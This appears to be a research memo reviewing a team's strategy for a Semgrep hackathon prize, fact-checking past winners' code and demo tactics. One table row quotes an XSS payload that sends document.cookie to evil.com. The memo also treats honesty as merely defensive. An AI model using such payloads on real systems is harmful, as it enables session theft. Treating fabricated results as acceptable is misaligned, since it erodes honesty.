> Imported historical/advisory research. This is not current build authority; follow the ScopeWatch architecture/contracts and START_HERE. Original research date and qualifications remain below.

# Semgrep: devil's advocate review

> **Current execution policy:** [Start now or anytime, with no build cutoff](../../../../../event/BUILD_AUTHORIZATION.md). The human reports that the event is already underway and public schedules are stale. Older start/deadline/duration advice below is superseded; historical timestamps and analytics windows remain evidence, not build gates.

Reviewer: Semgrep devil's advocate. Date: 2026-10-08. Read-only. Nothing installed or run except `curl`/`yt-dlp` fetches and `git log` on the Darwin clone.

**Scope.** I attacked the team's conclusions in `_TEAM.md`, `darwin.md`, `commitdna.md`, `udon-cat.md` and `_SEMGREP_PLATFORM.md`. I checked them against the Darwin source, the CommitDNA hosted bundle, the Semgrep registry API, Semgrep's GitHub source (v1.180.0 tag and `develop`), the AWS AI Agents Devpost (prize page, all 56 gallery projects) and Semgrep's blog.

**Bottom line.** Most factual claims hold up. Three conclusions do not:

1. **The tier mapping is unsupported.** The two public signals, Devpost order and blog order, both put Darwin first. The mapping is not knowable either way.
2. **The survivorship data undercuts "custom rule live = the opening".** Every ingredient of the recommended play appeared in losing Semgrep entries at the same event. One project with custom Semgrep rules and an "LLM proposes, Semgrep verifies" story won 1st overall but *not* the Semgrep prize.
3. **The recommended play is too long for 3 minutes.** It also re-implements features Semgrep already ships. It needs a sharper hook, not more pipeline.

---

## 1. Fact-check table

| # | Claim (team) | Verdict | Evidence |
|---|---|---|---|
| 1 | Darwin runs `semgrep --config p/security-audit --config p/python --json` on a temp file | **CONFIRMED** | `repos/semgrep/darwin/backend/forge/scanner.py:338-352`: `NamedTemporaryFile(suffix='.py')`, then `subprocess.run(['semgrep','--config','p/security-audit','--config','p/python','--json','--timeout','30','--max-memory','2000',temp_file], timeout=30)` |
| 2 | Severity penalties −40/−25/−10/−5 feed 40% of fitness | **CONFIRMED** | `scanner.py:381-389`; `evolutions/fitness.py:43-55`: `security_score * 0.4` |
| 3 | Fails open to 100 (`orchestrator.py:153-157`) | **CONFIRMED but OVERSTATED** | The code is real (`app/orchestrator.py:150-157` returns `{'score': 100}` on ImportError/AttributeError/any Exception). But `scan_tool_security` catches Semgrep failures itself and falls back to the **regex heuristic**, not to 100 (`scanner.py:61-74`). The flat 100 fires only if the import fails or the heuristic itself throws. The more serious fabrication is elsewhere: `app/main.py:188-227` returns `random.uniform(85,98)` security scores ("make it look real") whenever the competition throws |
| 4 | "llama-4-maverick" is actually Claude | **CONFIRMED** | `ai/bedrock.py:28-31`: `"llama-4-maverick": "us.anthropic.claude-sonnet-4-20250514-v1:0",  # Use Claude as fallback for now` |
| 5 | Quality score is random; the validator is never called | **CONFIRMED** | `forge/generator.py:184,439`: `random.randint(min_qual, max_qual)  # Will be overridden by validator`. A grep finds `forge.validator` imported only by tests and `forge/__init__.py`, never by `app/` |
| 6 | Real Semgrep call committed at 15:01, about 90 min before deadline | **CONFIRMED** | `git log`: `06d75a6 2025-10-10 15:01:15 -0700 ariahan feat: Enhance AWS Bedrock setup with Semgrep integration`. Diff adds the `'semgrep'` subprocess (+166 lines in scanner.py). Deadline 16:30 PT |
| 7 | CommitDNA hosted JS makes no network calls | **CONFIRMED** | Re-fetched 10 chunks from commit-dna.pages.dev. App chunks (`app_page`, `analysis`, `dashboard`) have 0 `fetch(`/`EventSource`/`XMLHttpRequest`/`axios`. The 2 hits in `train_page` are an XSS payload string (`<script>fetch("//evil.com?c="+document.cookie)`). The 11 hits in `vendor` are the Next.js runtime |
| 8 | CommitDNA has 2 plausible and 3 invented rule IDs | **WRONG (too generous)** | Checked against `semgrep.dev/api/registry/rules/<id>`. **0 of 5 resolve.** `javascript.express.security.injection.tainted-sql-string` is a truncated form of a real ID (404; full `…tainted-sql-string.tainted-sql-string` = 200). `javascript.react.security.audit.react-dangerouslysetinnerhtml` has the wrong language prefix (real: `typescript.react…react-dangerouslysetinnerhtml` = 200). `javascript.jwt.security.jwt-hardcoded-secret` (404) has a real analog at `javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret` (200). `javascript.lang.security.audit.hardcoded-secret` and `javascript.express.security.best-practice.input-validation` have no analog (404). Conclusion: **every CommitDNA rule ID is LLM-hallucinated, and it still won** |
| 9 | Udon Cat rule IDs are verbatim registry IDs | **CONFIRMED** | `python.lang.security.audit.md5-used-as-password.md5-used-as-password`, `python.lang.security.deserialization.pickle.avoid-pickle` and `python.lang.security.audit.formatted-sql-query.formatted-sql-query` all return 200 |
| 10 | Udon Cat never re-scans | **CONFIRMED (demo only)** | YouTube auto-captions: no "rescan" or "scan again" after fixing. The close is "fixed code that we can copy into Bolt… a fully secure project". Speaker also says "hopefully this finishes before three minutes", a live-latency tell |
| 11 | 3-tier prize wording | **CONFIRMED verbatim** | aws-agentic-ai-hackathon.devpost.com: 1st $2,500 "Generate Rules for Agents — Create an agent that helps customize your security experience. Incorporate an agentic workflow that improves security"; 2nd $1,500 "Write a rule to check your code or any agents for custom security practices."; 3rd $1,000 "Run a Semgrep scan that finds no vulnerabilities of any generated or code you write." |
| 12 | "Semgrep blogged about all three as trends" | **CONFIRMED, with a twist the team missed** | Blog (25 Nov 2025): Trend 1 Darwin, Trend 2 CommitDNA, Trend 3 Udon Cat, Trend 4 AgentSafe (a non-winner). The blog **repeats Darwin's Devpost marketing as fact**: "Picking from multiple LLMs such as Claude, GPT-4, and Llama… Certain models repeatedly generated safer code". Code shows GPT-4 is not wired and "Llama" is Claude. Semgrep's own staff evaluated the *story and demo*, not the code |
| 13 | `semgrep mcp` is built into the current binary | **CONFIRMED, with caveats** | `cli/src/semgrep/mcp/server.py` exists at tag **v1.180.0** (2026-10-07), with 9 `add_tool` calls. README shows `semgrep mcp [-t stdio\|streamable-http]`. Caveats are in §4: on local stdio only **7 tools** are live, and `semgrep_scan` takes no config, so it uses `auto` and errors when metrics are off |
| 14 | "≥3 sponsor tools wasn't required to win the Semgrep prize" | **CONFIRMED** | Udon Cat's Devpost "Built with" lists cerebras, qwen, semgrep only |
| 15 | "No winner demonstrated a custom Semgrep rule" | **CONFIRMED, but the inference drawn from it is weak** | See §3: others did, and lost |

## 2. Tier-mapping challenge

Team mapping: CommitDNA → 1st, Udon Cat → 1st/2nd, Darwin → 3rd. **No placement is published.** All three Devpost pages show only "Winner · Best Use of Semgrep".

**Counter-mapping: Darwin 1st, CommitDNA 2nd, Udon Cat 3rd.** It is at least as defensible.

- **Darwin fits tier 1 as well as CommitDNA does.** It is an "agentic workflow that improves security": selection pressure toward models that write secure code, with Semgrep as the fitness function. Semgrep's blog praised exactly that ("measurable pressure from a reliable SAST security scan").
- **CommitDNA fits tier 2 best.** Its stated mechanism is that Claude "reverse-engineer[s] Semgrep rules" into personalised ("custom security practices") training. That is the closest thing to "write a rule" among the three, even though it was never shown.
- **Udon Cat fits tier 3.** Its pitch ends on "a fully secure project", which is the tier-3 sentence.
- **Devpost gallery order is Darwin → CommitDNA → Udon Cat.** I tested whether gallery order encodes rank using the overall prize. The order is TidyShot → AuditArc → CookieLens. TidyShot = 1st overall (LinkedIn, Mona Udasi: "won first place") and AuditArc = 2nd (LinkedIn, Umar Turdiev: "2nd place out of 60+ teams"). So the order matched rank. **But it is confounded:** both groups are also in descending Devpost-creation order (TidyShot 19:47, AuditArc 19:30, CookieLens 18:52 EDT; Darwin 19:39, CommitDNA 19:29, Udon Cat 17:34 EDT). So gallery order is weak evidence at best.
- **Blog order is also Darwin → CommitDNA → Udon Cat**, but it is organised by trend, so it is weak evidence too.

**What the tiers actually were (inference, medium confidence).** They were *suggested challenges*, not gates. No winner literally satisfied tier 2, since none showed a rule. Every winner's on-screen output would have failed tier 3 scrutiny: Darwin's 100 could be a heuristic, and Udon Cat never re-scanned. Judges most likely ranked by overall impression and then handed out $2.5k/$1.5k/$1k.

**Implication.** Don't engineer to a tier. If Darwin was 1st, the *thinnest* integration (one subprocess, no finding shown, fail-open) took the top money on narrative alone. That is the uncomfortable reading the team didn't consider.

## 3. Survivorship evidence (all 56 gallery projects fetched)

- Semgrep was in "Built with" for **20/56** projects and mentioned in the story of **25/56**.
- **3 won the Semgrep prize (12% of Semgrep users).**

Non-winners that did what the team now recommends:

| Project | What it did with Semgrep | Result |
|---|---|---|
| **TidyShot** | **Wrote custom Semgrep rules** (text-pattern rules for secrets in OCR'd screenshots). Story: "LLM proposes, Semgrep verifies" ("Pure LLM detection has ~15% false positive rate; adding Semgrep brought it to <1%") | Won **1st overall + Best Use of Vanta**, *not* Semgrep. Multi-prize wins were allowed, so Semgrep judges passed on it |
| **security-goons** | Semgrep **MCP** subagents (`@semgrep-supply-chain-scanner`, `@semgrep-findings-fetcher`), fix generator, then a **COMMIT phase "@security-scanner (rescan)"**. This is the scan → fix → re-scan loop | No prize. No demo video on Devpost |
| **Yoru** | Every agent-generated file is Semgrep-scanned **before execution** in a Daytona sandbox; the agent auto-remediates. This is a fail-closed gate, Guardian-style | No prize |
| **IndieCode Shield** | Devpost lists "Custom Semgrep Rules" in YAML: `pattern-either` for Stripe/PayPal keys, a taint rule for SQLi, **a taint rule for prompt injection → `llm.generate`**, and RCE via `eval`. Repo `johnsonkoshy/ai-security-agent` contains **no rule YAML**, only `p/security-audit` packs (`semgrep_mcp_server.py:79-91`) and a `semgrep_mock.py` | No prize |
| AI-powered security code review | Semgrep MCP + Claude explanations + tickets + Vanta | No prize |
| Watchman | Semgrep on every push/PR, Bedrock triage, "curated Semgrep rules + AI filtering", auto issues/PRs | No prize |
| AgentSafe | Semgrep scan of an MCP server's source before connecting, plus Vanta | No prize, yet **featured in Semgrep's blog** |
| Secure Case Chat | "Learned about semgrep and custom rules" | No prize |

**What this means:**

- **"Custom rule = the opening" is not supported.** Custom rules were claimed by IndieCode Shield (lost), actually built by TidyShot (won elsewhere, not Semgrep), and absent from all three Semgrep winners.
- *Shown live* custom rules remain untested: none of the losers demoed one either, as far as Devpost text shows. So "custom rule shown live wins" is **untested, not disproven**.
- **Scan → fix → re-scan and a pre-exec gate both lost** (security-goons, Yoru). The loop architecture alone does not win.
- **What all three winners share and the losers mostly lack:**
  1. **one novel framing of Semgrep** (an evolutionary fitness function / a personal tutor / browser vibe-coding);
  2. **a persona or metaphor** (Apex Predator, a Duolingo/Tinder swipe deck, a cat);
  3. a polished UI with **Semgrep badged on screen**;
  4. a **demo video under 3 min**.
- Honesty and depth were *not* decisive. CommitDNA's rule IDs are all hallucinated and its UI is scripted. Darwin's narration contradicts its own scores.

**Caveat.** I only read Devpost text, not losers' videos. Presentation quality could explain losses (security-goons had no video at all).

## 4. Stress-test of the recommended play

The play: agent writes rule → `semgrep --test` → variant sweep → patch → rescan to zero, fail closed. Budget: about 5.5 h of build (11:00–16:30) and a 3-min demo.

### What breaks live

1. **Too many beats for 3 minutes.** Each LLM rule-drafting call takes about 10–30 s. Each `semgrep` invocation has 1–5 s of startup, plus a registry fetch if any `p/` pack is cold. A realistic loop is draft → test fail → redraft → test pass → sweep → patch → rescan → tests. That is 6–8 sequential calls, about 1.5–3 min of wall clock, *before* narration. Udon Cat's simpler scan+fix already had the speaker saying "hopefully this finishes before three minutes".
   - **Fix:** run one beat live (the rule passing `semgrep --test`, then the sweep). Pre-compute the rest with an explicit "cached run" label. Record the full run as the Devpost video.
2. **LLM-written Semgrep YAML fails often.** Common problems:
   - invalid pattern syntax;
   - taint rules without `focus-metavariable`, which over-match;
   - rules that match only the seed sample, which is overfit.

   `semgrep --test` also needs `# ruleid: <id>` / `# ok: <id>` comment annotations immediately above the target line, in a file named after the rule (`rule.yaml` ↔ `rule.py`; docs.semgrep.dev/writing-rules/testing-rules). The LLM must emit those exactly.
   - **Fix:** feed it `semgrep_rule_schema` and give it 2–3 retries, but have a known-good rule ready as a fallback.
3. **OSS taint is intraprocedural and single-file.** Cross-file or cross-function flows need the Pro engine (login/token). A demo vuln whose source→sink crosses files will silently produce **0 findings**, which reads as "clean" in a rescan-to-zero story.
   - **Fix:** pick an intra-function sink, and *prove* the rule fires on the unpatched code first.
4. **Rescan-to-zero is trivially gameable.** It is your own rule against your own patch, and an LLM patch that deletes the function also scores zero. Product judges will ask "how do you know the fix is right?"
   - **Fix:** add a functional test plus a negative corpus. For example, run the new rule over 2–3 real OSS repos and show FP = 0. That is the credibility beat, not the zero.
5. **MCP gotchas (verified in v1.180.0 `server.py`):**
   - Local stdio exposes **7 tools**, not 9. `semgrep_scan_remote` is removed when not hosted, and `semgrep_whoami` is removed on stdio (`deregister_tools`).
   - `semgrep_findings` needs an AppSec Platform token.
   - **`semgrep_scan` (local) has no `config` parameter.** It runs `semgrep scan --json --experimental --x-mcp <dir>`, which means `auto` or logged-in config. It **raises "Cannot run scan with auto config when metrics are off"** if `SEMGREP_SEND_METRICS=off` (`get_semgrep_scan_args`, lines ~295-330). So you cannot both disable metrics and use MCP `semgrep_scan`.
   - `semgrep_scan_with_custom_rule` takes **file contents** plus a rule string, not paths.
   - **No MCP tool runs `semgrep --test`.** The test harness is CLI-only.
   - The platform doc's `remediate()` sketch calls `sweep(f"r/{finding['check_id']}")`. That works for registry IDs but **fails for a local custom rule**, whose `check_id` is path-namespaced. Use the local YAML path.
6. **Venue network.** Registry pack downloads and `--config auto` need internet. Pre-warm, vendor the YAML packs into the repo, and run with local configs.

### What Semgrep's product judges may find unimpressive

Milan Williams wrote the Guardian launch post. Daghan Altas's 2026 talk is "The End is Nigh (For Code Reviews)": agents with *organizational context* that find, triage and fix "at lower cost per vulnerability".

- **"LLM writes a Semgrep rule" is already a Semgrep feature.** It ships as the MCP `write_custom_semgrep_rule` prompt, Assistant "custom SAST guardrails with human language" (2024 blog), and Malware D&R's "rules generated within minutes". Re-implementing it reads as a clone of their roadmap unless the **trigger** is novel. Example: rule generated from a live attack signal or an incident/CVE feed, then pushed into the agent's own guardrail hooks.
- **Scan → LLM fix → re-scan is Guardian plus Autofix.** Same risk.
- **A wall of pipeline steps with no human-relevant metric.** Daghan's framing suggests showing **false-positive rate, time-to-protection, or cost per verified fix**, not just "0 findings".
- **Hallucinated rule IDs, scripted logs, fail-open.** CommitDNA got away with it in 2025, judged by AWS SAs plus Semgrep DevRel. 2026's judges are the product owners and the risk is higher. Still, survivorship shows honesty isn't what wins, only what avoids an embarrassing question.

## 5. Revised winning formula (confidence-rated)

| # | Element | Confidence | Why |
|---|---|---|---|
| 1 | **One novel, nameable framing of what Semgrep *is* in your system** (fitness function / tutor / browser guard in 2025). Candidates for 2026: Semgrep as the **immune system** that writes antibodies (rules) from live attacks, or as the **referee** that decides which agent's patch ships | **High** | It is the only factor common to all 3 winners and absent from most of the 22 losers. Semgrep's blog organised its write-up around framings ("trends"), not implementation |
| 2 | **Semgrep visibly decides something on screen** (rank, gate, block) with a badge/weight shown | **High** | All 3 winners badged Semgrep in-UI. Darwin's "40% of Fitness" panel was its whole Semgrep story |
| 3 | **Tie it to the judges' 2026 product line**: Guardian (hooks / agent-written code), Agentic Workflows, AI/Agent-Skills rulesets, malware D&R. Say the product names | **Medium-high** | Judges are product leads. The 2025 blog mapped every winner to a product direction |
| 4 | **Persona plus one memorable artifact/metric**, delivered in under 3 min | **Medium-high** | Present in all 3 winners. The losers with weak presentation (no video) lost |
| 5 | **One genuine live Semgrep moment with a real registry ID or a real custom rule + file:line**, everything else pre-computed and labelled | **Medium** | Udon Cat's verbatim IDs built credibility. But CommitDNA won with fake IDs, so this is defence against product judges, not offence |
| 6 | **Custom rule written by an agent, proven by `semgrep --test`, plus an FP check on real repos** | **Medium-low as a differentiator** | Untested as a winning factor. Rules claimed or built by others did not win Semgrep. It is also a Semgrep feature already, so it only pays off as the payload of #1 (e.g. "attack seen → antibody rule in 60 s → every agent now blocked"), not as the headline |
| 7 | Scan → fix → re-scan to zero, fail closed | **Low as a differentiator** (keep it as hygiene) | security-goons and Yoru did it and lost. It is cheap, though, and pre-empts the "is the fix right?" question |
| 8 | Multi-sponsor stacking (ClickHouse/Guild/Pi) | **Low for the Semgrep prize**, higher for the overall prize | Udon Cat won with Semgrep only |

**Concrete adjustment to the play.** Keep the rule-gen loop as the engine, but make the *demo* about the framing:
- (0:00–0:20) Hook: an attack happens.
- (0:20–1:20) Live: the agent drafts a rule, `semgrep --test` shows ✓, and the sweep finds N real file:line hits.
- (1:20–2:20) Guardian-style hook: the coding agent tries to write the same pattern again and gets **blocked in-loop**.
- (2:20–3:00) Metric: time-to-protection and FP=0 on a negative corpus.

Cut the multi-model patch tournament and the live rescan; show those as pre-recorded evidence.

## 6. Open questions

1. **Actual 2025 placements.** Ask Semgrep DevRel (Jayson DeLancey / Braden Riggs) or the winners on LinkedIn. If Darwin was 1st, narrative clearly beats depth.
2. **Who judged the 2025 Semgrep prize?** It could have been Semgrep DevRel (the blog authors) or the AWS SA judges. 2026 has product leads, so 2025's leniency toward scripted demos may not transfer.
3. **2026 prize wording.** It is unpublished, and cyberhack.devpost.com returns 403. If the tiers repeat, tier 2 ("write a rule") makes #6 more valuable. Re-rate at kickoff.
4. Did any losing project **demo** a custom rule live? I checked Devpost text only, not losers' videos (Yoru `6VwYj-W_-Bg`, IndieCode Shield `OWvSG9jomww`, Watchman `lk2cszEDIAs`).
5. Does `semgrep --test --json` produce stable JSON in v1.180.0? I did not verify it (nothing installed). Check at kickoff.
6. Is Guardian's hook API usable by a hackathon agent without a paid token? The `hooks/` directory exists in `cli/src/semgrep/mcp/`, but the auth requirements weren't checked.
